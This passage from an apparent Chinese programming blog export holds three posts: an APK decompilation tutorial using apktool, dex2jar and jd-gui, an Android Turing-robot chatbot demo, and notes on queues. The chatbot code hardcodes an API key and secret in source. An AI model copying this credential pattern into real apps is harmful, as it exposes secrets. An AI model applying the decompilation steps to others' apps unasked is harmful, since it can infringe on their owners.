    <content><![CDATA[<p>　　如果你已经具备一定的 Android 开发基础，那你一定会思考别人的 App 是怎么做的，在使用一款 App 的时候也会想它这个布局、这个效果是怎么实现的？思考是好事，但是全靠猜可不行，如何拿到他的源代码呢？反编译的作用不言而喻。直接拿别人的源码确实不太道德，所以我们提倡学习借鉴，而不是复制。</p>
<a id="more"></a>
<p><strong>使用工具：</strong></p>
<ul>
<li><p>apktool（获取资源文件工具）</p>
<p><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">apktool官方地址</a></p>
</li>
<li><p>dex2jar（获取源码文件工具）</p>
<p><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">dex2jarGithub地址</a></p>
</li>
<li><p>jd-gui（源码查看工具）</p>
<p><a href="http://jd.benow.ca/" target="_blank" rel="external">jd-gui官方地址</a></p>
</li>
</ul>
<p><strong>工具打包下载地址：</strong></p>
<p>　　百度云链接：<a href="http://pan.baidu.com/s/1jHVHc4Q，密码：ra3u" target="_blank" rel="external">http://pan.baidu.com/s/1jHVHc4Q，密码：ra3u</a></p>
<p>　　<strong>注：以下操作需要你的电脑安装JDK，我们假设你已经安装了，并配置好了环境变量。</strong></p>
<h4 id="反编译得到资源文件"><a href="#反编译得到资源文件" class="headerlink" title="反编译得到资源文件"></a>反编译得到资源文件</h4><p>　　apktool反编译得到程序的源代码、图片、XML配置、语言资源等文件。</p>
<h5 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h5><p>　　如果你只需要简单的反编译，那下面这条命令已经能够满足你的需求。在Windows下，使用cmd进入到下载的decompile文件夹，然后使用如下命令进行反编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">apktool.jar d apk文件路径</div></pre></td></tr></table></figure>
<h5 id="配置更多"><a href="#配置更多" class="headerlink" title="配置更多"></a>配置更多</h5><p>　　如果你需要使用带参数的 apktool，体验更多的功能，或者你经常使用反编译，那建议你进行相应的配置。将decompile文件夹下的 apktool.jar 和 apktool.bat 移动/复制到 C:\Windows目录下(需要管理员权限)，如果不进行这一步，使用 apktool 命令时会提示： ‘apktool’ 不是内部或外部命令，也不是可运行的程序或批处理文件。此处操作的原理就是将 apktool 的文件加入到环境变量中，因为 C:\Windows 已经在系统的环境变量中，所以复制到该文件夹后，apktool 就成为了一个随处可用的命令。</p>
<p>　　比如使用 apktool 命令进行反编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">apktool d apk文件路径</div></pre></td></tr></table></figure>
<p><strong>apktool有如下参数可供使用：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">(1) -version 或者 --version 查看apktool版本信息</div><div class="line"></div><div class="line">(2) -advance 或者 --advanced 输出更详细的信息</div><div class="line"></div><div class="line">(3) d 或者 decode 反编译</div><div class="line"></div><div class="line">(4) b 或者 build 编译</div><div class="line"></div><div class="line">(5) -o 或者 --output &lt;dir&gt; apk反编译后输出到指定目录</div><div class="line"></div><div class="line">---------------------------以上较常用-----------------------------</div><div class="line"></div><div class="line">(6) -r 或者 --no-res 阻止反编译resource，不修改resources.arsc，若仅仅修改java（smail），建议使用该选项</div><div class="line"></div><div class="line">(7) -s 或者 --no-src 阻止dex文件分割，在build时仅仅移动classes.dex，若需要快速打包，建议使用该选项</div><div class="line"></div><div class="line">(8) -f 或者 --force-all 在打包时重写已经存在的文件，强制覆盖</div><div class="line"></div><div class="line">(9) -t 或者 --frame-tag &lt;TAG&gt; 给生成的framework文件打上标识</div><div class="line"></div><div class="line">(10) -p 或者 --frame-path &lt;dir&gt;指定framework文件储存的位置</div></pre></td></tr></table></figure>
<p>　　使用 apktool 进行反编译之后可以得到 android 工程的 res 目录下的所有文件，以及 AndroidManifest.xml，还有一个 smali 文件夹，很可惜，这个文件夹里的文件并不是 java 文件，而是很多 smali 格式的文件。如下图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/10/3-2.png" alt="3-2"></p>
<p>　　因为 Android 系统有自己的虚拟机 Dalvik，代码编译最终不是采用的 java 的 class，而是使用的 smali。如果我们懂一点 smali 语法，那看懂这些文件也是不成问题的，但是我们有更好的办法，请看下一步。</p>
<h4 id="Apk反编译得到Jar文件"><a href="#Apk反编译得到Jar文件" class="headerlink" title="Apk反编译得到Jar文件"></a>Apk反编译得到Jar文件</h4><ol>
<li>在 windows 下，使用 cmd 进入到下载的 decomplie 目录下的 dex2jar 文件夹</li>
<li>将 apk 文件改成 rar 后者 zip 文件，然后解压得到 classes.dex 文件</li>
<li>将解压得到的 classes.dex 文件复制到 dex2jar 文件夹内</li>
<li>使用如下命令得到 classes-dex2jar.jar 文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">d2j-dex2jar.bat classes.dex文件的路径</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/10/3-3.png" alt="3-3"></p>
<p>　　在 dex2jar 文件夹可以看到生成了一个 classes-dex2jar.jar 的文件，然后通过下一步的工具即可查看项目java源码。</p>
<h4 id="使用jar查看器查看源码"><a href="#使用jar查看器查看源码" class="headerlink" title="使用jar查看器查看源码"></a>使用jar查看器查看源码</h4><p>　　打开下载的 decompile 文件夹中的 jd-gui-windows-1.4.0 目录下的 jd-gui.exe ，使用 jd-gui 打开上一步得到的jar文件即可看到项目的 java 源码，如下图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/10/3-1.png" alt="3-1"></p>
<p>　　此工具可用来查看 jar 文件，其实很多第三方的 jar 包也是可以通过此工具打开进行查看的。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 聊天机器人之图灵机器人</title>
    <url>/2016/09/22/Android%20%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%B9%8B%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    <content><![CDATA[<p>　　图灵机器人—-中文语境下智能度最高的机器人大脑。之前写了一个有意思的小 Demo，其实也比较简单，只是使用了图灵机器人的 SDK 来做了一个简单的聊天机器人，不过图灵机器人确实比较智能，而且功能十分丰富，它不仅提供了数据访问接口，还集成了 SDK 供大家使用，所以很方便很实用。如果无聊了，就自己动手来做一个聊天机器人解解闷吧！</p>
<a id="more"></a>
<h5 id="下载Android版本SDK"><a href="#下载Android版本SDK" class="headerlink" title="下载Android版本SDK"></a>下载Android版本SDK</h5><p>　　图灵机器人官网：<a href="http://www.tuling123.com/" target="_blank" rel="external">http://www.tuling123.com/</a> 。注册之后创建机器人，就可以得到APIKEY和密钥，然后下载SDK，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/22-1.png" alt="22-1"></p>
<h5 id="将SDK添加到工程中"><a href="#将SDK添加到工程中" class="headerlink" title="将SDK添加到工程中"></a>将SDK添加到工程中</h5><p>　　将SDK压缩包中的libs文件夹复制到工程目录替换掉原来的libs。</p>
<h5 id="添加权限"><a href="#添加权限" class="headerlink" title="添加权限"></a>添加权限</h5><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECORD_AUDIO"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_WIFI_STATE"</span> /&gt;</span></div></pre></td></tr></table></figure>
<h5 id="SDK初始化"><a href="#SDK初始化" class="headerlink" title="SDK初始化"></a>SDK初始化</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">SDKInitBuilder builder = <span class="keyword">new</span> SDKInitBuilder(<span class="keyword">this</span>)</div><div class="line">                .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY)</div><div class="line">                .setUniqueId(UNIQUEID);</div><div class="line">SDKInit.init(builder, <span class="keyword">new</span> InitListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFail</span><span class="params">(String arg0)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">    </div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        mTuringApiManager = <span class="keyword">new</span> TuringApiManager(MainActivity.<span class="keyword">this</span>);</div><div class="line">        mTuringApiManager.setHttpListener(myHttpConnectionListener);</div><div class="line">        <span class="comment">// ttsManager.startTTS("你好啊");              </span></div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h5 id="聊天机器人Demo"><a href="#聊天机器人Demo" class="headerlink" title="聊天机器人Demo"></a>聊天机器人Demo</h5><p>　　实现的效果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/22-2.png" alt="22-2"></p>
<p>　　实现步骤：</p>
<h5 id="定义消息实体类"><a href="#定义消息实体类" class="headerlink" title="定义消息实体类"></a>定义消息实体类</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChatMessage</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> String name;    <span class="comment">//消息的名字</span></div><div class="line">    <span class="keyword">private</span> String msg;     <span class="comment">//消息的内容</span></div><div class="line">    <span class="keyword">private</span> Type type;      <span class="comment">//消息的类型</span></div><div class="line">    <span class="keyword">private</span> Date date;      <span class="comment">//消息的时间</span></div><div class="line">    </div><div class="line">    <span class="comment">//消息类型：发送、接收</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> Type &#123;</div><div class="line">        INCOMING, OUTCOMING</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChatMessage</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChatMessage</span><span class="params">(String msg,Type type,Date date)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></div><div class="line">        setMsg(msg);</div><div class="line">        setType(type);</div><div class="line">        setDate(date);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//生成各成员属性的set和get方法</span></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> msg;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(String msg)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.msg = msg;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> type;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(Type type)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.type = type;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getDate</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> date;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Date date)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.date = date;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="编写适配器类"><a href="#编写适配器类" class="headerlink" title="编写适配器类"></a>编写适配器类</h5><p>　　使用适配器将数据与视图绑定起来。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChatMessageAdapter</span> <span class="keyword">extends</span> <span class="title">BaseAdapter</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> List&lt;ChatMessage&gt; mDatas;</div><div class="line">    <span class="keyword">private</span> Context mContext;</div><div class="line">    </div><div class="line">    <span class="comment">//使用ViewHolder临时存储view，提高效率</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> </span>&#123;</div><div class="line">        TextView mDate;</div><div class="line">        TextView mMsg;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChatMessageAdapter</span><span class="params">(Context context, List&lt;ChatMessage&gt; data)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></div><div class="line">        mDatas = data;</div><div class="line">        mContext = context;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">return</span> mDatas.size();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getItem</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">return</span> mDatas.get(position);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getItemId</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">return</span> position;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//得到布局的类型</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemViewType</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">        ChatMessage chatMessage = mDatas.get(position);</div><div class="line">        <span class="keyword">if</span> (chatMessage.getType() == Type.INCOMING) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getViewTypeCount</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        ViewHolder viewHolder = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">if</span> (convertView == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="comment">//更具不同的布局，加载不同的控件</span></div><div class="line">            <span class="keyword">if</span> (getItemViewType(position) == <span class="number">0</span>) &#123;</div><div class="line">                convertView = LayoutInflater.from(mContext).inflate(</div><div class="line">                        R.layout.item_from_msg, <span class="keyword">null</span>);</div><div class="line">                viewHolder = <span class="keyword">new</span> ViewHolder();</div><div class="line">                viewHolder.mDate = (TextView) convertView</div><div class="line">                        .findViewById(R.id.id_form_msg_date);</div><div class="line">                viewHolder.mMsg = (TextView) convertView</div><div class="line">                        .findViewById(R.id.id_from_msg_info);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                convertView = LayoutInflater.from(mContext).inflate(</div><div class="line">                        R.layout.item_to_msg, <span class="keyword">null</span>);</div><div class="line">                viewHolder = <span class="keyword">new</span> ViewHolder();</div><div class="line">                viewHolder.mDate = (TextView) convertView</div><div class="line">                        .findViewById(R.id.id_to_msg_date);</div><div class="line">                viewHolder.mMsg = (TextView) convertView</div><div class="line">                        .findViewById(R.id.id_to_msg_info);</div><div class="line">            &#125;</div><div class="line">            convertView.setTag(viewHolder);     <span class="comment">//使用setTag把view缓存起来</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            viewHolder = (ViewHolder) convertView.getTag();     <span class="comment">//使用getTag得到view</span></div><div class="line">        &#125;</div><div class="line">        ChatMessage chatMessage = mDatas.get(position);</div><div class="line">        <span class="comment">// 设置数据</span></div><div class="line">        SimpleDateFormat df = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</div><div class="line">        viewHolder.mDate.setText(df.format(chatMessage.getDate()));</div><div class="line">        viewHolder.mMsg.setText(chatMessage.getMsg());</div><div class="line">        <span class="keyword">return</span> convertView;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="实现业务逻辑"><a href="#实现业务逻辑" class="headerlink" title="实现业务逻辑"></a>实现业务逻辑</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * 申请的turing的apikey</div><div class="line">     * **/</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String TURING_APIKEY = <span class="string">"56433fe6f67942ff80c4d7bd2d20fe34"</span>;</div><div class="line">    <span class="comment">/**</span></div><div class="line">     * 申请的secret</div><div class="line">     * **/</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String TURING_SECRET = <span class="string">"d9989eac6e4cab39"</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String UNIQUEID = <span class="string">"131313131"</span>;</div><div class="line">    <span class="keyword">private</span> TuringApiManager mTuringApiManager;</div><div class="line">    <span class="keyword">private</span> ListView mMsgs;</div><div class="line">    <span class="keyword">private</span> ChatMessageAdapter mAdapter;</div><div class="line">    <span class="keyword">private</span> List&lt;ChatMessage&gt; mDatas;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> EditText mInputMsg;</div><div class="line">    <span class="keyword">private</span> Button mSendMsg;</div><div class="line"></div><div class="line">    <span class="comment">//设置监听</span></div><div class="line">    HttpConnectionListener myHttpConnectionListener = <span class="keyword">new</span> HttpConnectionListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(RequestResult result)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</div><div class="line">            String res = result.getContent().toString();    <span class="comment">//获取服务器返回数据</span></div><div class="line">            System.out.println(res);</div><div class="line">            JSONObject jo;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                jo = <span class="keyword">new</span> JSONObject(res);   <span class="comment">//解析JSON格式数据</span></div><div class="line">                String text = jo.getString(<span class="string">"text"</span>);</div><div class="line">                mDatas.add(<span class="keyword">new</span> ChatMessage(text, Type.INCOMING, <span class="keyword">new</span> Date())); </div><div class="line">                mAdapter.notifyDataSetChanged();    <span class="comment">//更新UI</span></div><div class="line">                mMsgs.setSelection(mDatas.size()-<span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">catch</span> (JSONException e) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;   </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(ErrorMessage arg0)</span> </span>&#123;</div><div class="line">    <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">    </div><div class="line">    &#125;</div><div class="line">    &#125;;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        requestWindowFeature(Window.FEATURE_NO_TITLE);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        </div><div class="line">        <span class="comment">//SDK初始化</span></div><div class="line">        SDKInitBuilder builder = <span class="keyword">new</span> SDKInitBuilder(<span class="keyword">this</span>)</div><div class="line">                    .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY)</div><div class="line">                    .setUniqueId(UNIQUEID);</div><div class="line">        </div><div class="line">        SDKInit.init(builder, <span class="keyword">new</span> InitListener() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFail</span><span class="params">(String arg0)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            </div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">()</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                mTuringApiManager = <span class="keyword">new</span> TuringApiManager(MainActivity.<span class="keyword">this</span>);</div><div class="line">                mTuringApiManager.setHttpListener(myHttpConnectionListener);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        </div><div class="line">        initView();     <span class="comment">//初始化视图</span></div><div class="line">        initDatas();    <span class="comment">//初始化数据</span></div><div class="line">        </div><div class="line">        <span class="comment">//发送消息按钮的监听事件</span></div><div class="line">        mSendMsg.setOnClickListener(<span class="keyword">new</span> OnClickListener()</div><div class="line">        &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">final</span> String toMsg = mInputMsg.getText().toString();</div><div class="line">                <span class="keyword">if</span> (TextUtils.isEmpty(toMsg))</div><div class="line">                &#123;</div><div class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"发送消息不能为空！"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">                    <span class="keyword">return</span>;</div><div class="line">                &#125;</div><div class="line">            </div><div class="line">                <span class="comment">//得到输入框的内容，转化成一个消息对象</span></div><div class="line">                ChatMessage toMessage = <span class="keyword">new</span> ChatMessage(toMsg,Type.OUTCOMING,<span class="keyword">new</span> Date());</div><div class="line">                mDatas.add(toMessage);</div><div class="line">                mAdapter.notifyDataSetChanged();</div><div class="line">                mMsgs.setSelection(mDatas.size()-<span class="number">1</span>);</div><div class="line">                </div><div class="line">                <span class="comment">//清空输入框</span></div><div class="line">                mInputMsg.setText(<span class="string">""</span>);</div><div class="line">                </div><div class="line">                <span class="comment">//发送消息到图灵服务器</span></div><div class="line">                mTuringApiManager.requestTuringAPI(toMsg);</div><div class="line">            </div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//初始化数据</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDatas</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        mDatas = <span class="keyword">new</span> ArrayList&lt;ChatMessage&gt;();</div><div class="line">        mDatas.add(<span class="keyword">new</span> ChatMessage(<span class="string">"你好，小农为您服务"</span>, Type.INCOMING, <span class="keyword">new</span> Date()));</div><div class="line">        mAdapter = <span class="keyword">new</span> ChatMessageAdapter(<span class="keyword">this</span>, mDatas);</div><div class="line">        mMsgs.setAdapter(mAdapter);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//初始化视图</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initView</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        mMsgs = (ListView) findViewById(R.id.id_listview_msgs);</div><div class="line">        mInputMsg = (EditText) findViewById(R.id.id_input_msg);</div><div class="line">        mSendMsg = (Button) findViewById(R.id.id_send_msg);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构基础之队列</title>
    <url>/2016/09/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p>　　上一篇博客中我们总结了栈的相关知识，其实，在数据结构的教材中栈和队列通常是放在同一章进行讲解的，因为他们都是操作受限的线性表，只是具体的限制不同。队列是只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表，它的应用也是比较广泛的，比如在操作系统的处理进程对CPU资源的竞争以及我们常常提及的优先级队列等等。</p>
<a id="more"></a>
<h4 id="队列的基本概念"><a href="#队列的基本概念" class="headerlink" title="队列的基本概念"></a>队列的基本概念</h4><p>　　定义：只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表。</p>
<p>　　队头：允许进行删除操作的一端。</p>
<p>　　队尾：允许进行插入操作的一端。</p>
<h4 id="顺序队列"><a href="#顺序队列" class="headerlink" title="顺序队列"></a>顺序队列</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/8-1.jpg" alt="8-1"></p>
<p>　　采用顺序存储结构，即在内存中用一组地址连续的存储单元一次存放从队头到队尾的数据元素，同时设置两个指针 <code>front</code>、<code>rear</code> 分别指示队头元素和队尾元素的位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">typedef struct&#123;</div><div class="line">    ElemType data[MAXSIZE];     //存放数据元素的数组</div><div class="line">    int front,rear;     //头尾指针</div><div class="line">&#125;SeqQueue;</div></pre></td></tr></table></figure>
<p>　　队头指针：指示队头元素所在位置。</p>
<p>　　队尾指针：指示队尾元素的下一个位置。</p>
<p>　　入队操作：<code>rear = rear + 1</code></p>
<p>　　出队操作：<code>front = front + 1</code></p>
<p>　　当 <code>rear = MAXSIZE</code> 时，队列不一定真的占满整个数组空间，因为不管入队还是出队指针都是加，头指针一直加就会使得数组的前端可能出现许多空的单元，这种现象称为假溢出。为了充分利用数组空间，于是引入了循环队列。</p>
<h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/8-2.jpg" alt="8-2"></p>
<p>　　将队列的存储空间看成一个环状的空间，即将队列的首、尾的位置连接起来形成的结构称为循环队列。</p>
<p>　　入队操作：<code>Q-&gt;rear = (Q-&gt;rear + 1) % MAXSIZE</code></p>
<p>　　出队操作：<code>Q-&gt;front = (Q-&gt;front + 1) % MAXSIZE</code></p>
<h5 id="区分队空还是队满的方式"><a href="#区分队空还是队满的方式" class="headerlink" title="区分队空还是队满的方式"></a>区分队空还是队满的方式</h5><p>　　1、牺牲一个单元来区分队空和队满，约定以队头指针在队尾指针的下一个位置作为队满的标志，则有：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<p>　　2、类型中增设表示元素个数的数据成员，则有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">队空满条件：Q-&gt;size == 0</div><div class="line"></div><div class="line">队满条件：Q-&gt;size == MAXSIZE</div></pre></td></tr></table></figure>
